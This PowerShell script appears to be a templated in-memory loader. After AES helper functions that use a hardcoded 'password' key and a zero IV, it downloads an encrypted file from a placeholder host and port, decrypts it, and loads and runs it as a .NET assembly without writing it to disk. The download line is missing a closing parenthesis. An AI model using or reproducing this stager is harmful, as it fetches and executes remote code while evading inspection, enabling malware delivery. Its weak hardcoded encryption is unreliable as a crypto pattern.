
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    return $aesManaged
}

function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    return [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-Bytes($key, $IV, $data) {
    $bytes = $data
    $aesManaged = Create-AesManagedObject $key $IV
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $encData = $encryptedData
    $aesManaged.Dispose()
    return $encData
}

function Decrypt-Bytes($key, $IV, $enc_data) {
    $bytes = $enc_data
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    [byte[]] $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $aesManaged.Dispose()
    
    return $unencryptedData
}

$key = [System.Text.Encoding]::ASCII.GetBytes("password".PadRight(16,[char]0))
$key = [System.Convert]::ToBase64String($key)
Write-Host 'Key:' $key
$IV = 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
$IV = [System.Convert]::ToBase64String($IV)
Write-Host 'IV:' $IV

$plain = [System.Text.Encoding]::ASCII.GetBytes('abcd')
$enc = Encrypt-Bytes $key $iv $plain
$b64_enc = [System.Convert]::ToBase64String($enc)

Write-Host (Decrypt-Bytes $key $iv $enc)
[System.Text.Encoding]::ASCII.GetString((Decrypt-Bytes $key $iv $enc))

$y = (New-Object System.Net.WebClient).DownloadData('http://{{ip}}:{{port}}/{{filename}}'
$x = [System.Convert]::ToBase64String((Decrypt-Bytes $key $IV $y))
[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($x))

[HelloWorld]::Main($args)
